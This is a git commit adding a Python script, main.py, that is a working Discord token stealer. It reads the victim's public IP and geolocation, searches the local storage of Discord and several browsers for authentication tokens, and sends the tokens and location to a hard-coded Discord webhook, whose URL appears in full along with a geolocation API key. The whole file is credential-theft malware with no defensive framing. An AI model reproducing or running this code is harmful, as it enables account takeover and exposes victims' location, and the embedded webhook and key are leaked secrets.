ab6f5eca5cf878906d7ed435ab0ad774f9c1d1c5
ha.rib.v <111528174+haribv@users.noreply.github.com>
2024-03-25 19:41:43 +0100

    Create main.py

---
+++ main.py
@@ -0,0 +1,80 @@
+import os
+import requests
+import json
+import re
+from dhooks import Webhook, Embed
+from datetime import datetime
+
+# Discord webhook
+hook = Webhook("https://discord.com/api/webhooks/1212886195508482128/Bc0NpIpOp9QxoN_EsO8gMt1gXsiBNqPXeYl-kXKKA6zwgzAlV-h5yOADYXlhvVX56w_A")
+
+ip = requests.get('https://api.ipify.org/').text
+
+r = requests.get(f'https://geo.ipify.org/api/v2/country?apiKey=at_R8PCEHjzhgL8DHOnRamh4mJsjq5aj&ipAddress={ip}')
+geo = r.json()
+embed = Embed()
+
+# INVISIBLE IP
+embed.add_field(name='IP (Click to reveal)', value='||' + geo['ip'] + '||', inline=True)
+
+# IPS LOCS
+fields = [
+    {'name': 'Country', 'value': geo['location']['country']},
+    {'name': 'Region', 'value': geo['location'].get('region')},
+    {'name': 'Timezone', 'value': geo['location'].get('timezone')},
+    {'name': 'Route',   'value': geo['as'].get('route')},
+    {'name': 'Domain Name',   'value': geo['as'].get('name')},
+    {'name': 'Domain Details',   'value': geo['as'].get('domain')},
+    {'name': 'ASN',   'value': geo['as'].get('asn')}
+]
+
+# Function to find Discord tokens
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+# Run the main function
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                fields.append({'name': 'Token', 'value': token})
+        else:
+            fields.append({'name': 'Token', 'value': 'No tokens found.'})
+
+    for field in fields:
+        value = field.get('value')
+        if value is not None:
+            embed.add_field(name=field['name'], value=value, inline=True)
+
+    message = hook.send(embed=embed)
+main()
